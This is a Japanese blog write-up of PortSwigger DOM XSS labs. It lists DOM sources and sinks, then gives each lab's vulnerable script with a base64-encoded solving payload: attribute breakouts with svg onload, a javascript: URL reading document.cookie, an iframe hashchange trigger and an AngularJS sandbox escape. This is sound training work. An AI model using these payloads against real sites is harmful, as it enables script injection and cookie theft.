+++
date = '2026-01-17T22:26:08+09:00'
draft = false
title = 'CrossSiteScripting(DOM) - PortSwigger'
summary = "PortSwiggerのXSS-DOMについて"

categories = ["PortSwigger"]
tags = ["PortSwigger", "Writeup", "Web", "XSS", "DOM"]
+++

# CrossSiteScripting(DOM) - PortSwigger

## Note
- document
  - document.write
  - document.URL -> *"https://example.com/path/page.html?x=1#section1"*
- element
  - element.innerHTML
  - element.outerHTML
- location
  - location.href -> *"https://example.com/path/page.html?x=1#section1"*
  - location.origin -> *"https://example.com"*
  - location.path -> *"/path/page.html"*
  - location.search -> *"?x=1"*
  - location.hash -> *"#section1"*

> ＊ ブログサイトの都合上 xss ペイロード関連の文字列は base64 でエンコードしています。

## Lab
### DOM XSS in document.write sink using source location.search
```text
R0VUIC8/c2VhcmNoPSI+PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```
```html
<script>
  function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
  }
  var query = (new URLSearchParams(window.location.search)).get('search');
  if(query) {
    trackSearch(query);
  }
</script>
```

### DOM XSS in innerHTML sink using source location.search
```text
R0VUIC8/c2VhcmNoPTxzdmcgb25sb2FkPWFsZXJ0KDEpPg==
```
```html
<script>
  function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
  }
  var query = (new URLSearchParams(window.location.search)).get('search');
  if(query) {
    doSearchQuery(query);
  }
</script>
```

### DOM XSS in jQuery anchor href attribute sink using location.search source
> View Page Source や Burp はブラウザ内で JavaScript によって行われた DOM の変更（href の書き換え）は確認できない。一方 Inspect では、JavaScript 実行後の DOM を確認できるため、href 属性が変更されていることが分かる。
```text
R0VUIC9mZWVkYmFjaz9yZXR1cm5QYXRoPWphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
```
```html
<script src="/resources/js/jquery_1-8-2.js"></script>
<script>
  $(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
  });
</script>
```

### DOM XSS in jQuery selector sink using a hashchange event
> #以降が$()に読み込まれる  
`<svg onload>`はうまく発火しなかった
```text
PGlmcmFtZSBzcmM9Imh0dHBzOi8vY2hhbGxlbmdlLWhvc3QvIyIgb25sb2FkPSJ0aGlzLnNyYys9JzxpbWcgc3JjPXggb25lcnJvcj1wcmludCgpPiciPjwvaWZyYW1lPg==
```
```html
<script src="/resources/js/jquery_1-8-2.js"></script>
<script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
<script>
  $(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
  });
</script>
```

### DOM XSS in document.write sink using source location.search inside a select element
> location.search で storedId を読み込んでいるので URL に追加する
```text
R0VUIC9wcm9kdWN0P3Byb2R1Y3RJZD0yJnN0b3JlSWQ9PHN2ZyUyMG9ubG9hZD1hbGVydCgxKT4=
```
```html
<script>
  var stores = ["London","Paris","Milan"];
  var store = (new URLSearchParams(window.location.search)).get('storeId');
  document.write('<select name="storeId">');
  if(store) {
    document.write('<option selected>'+store+'</option>');
  }
  for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
      continue;
    }
    document.write('<option>'+stores[i]+'</option>');
  }
  document.write('</select>');
</script>
```

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
```text
R0VUIC8/c2VhcmNoPXt7JG9uLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCl9fQ==
```
```html
<script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
```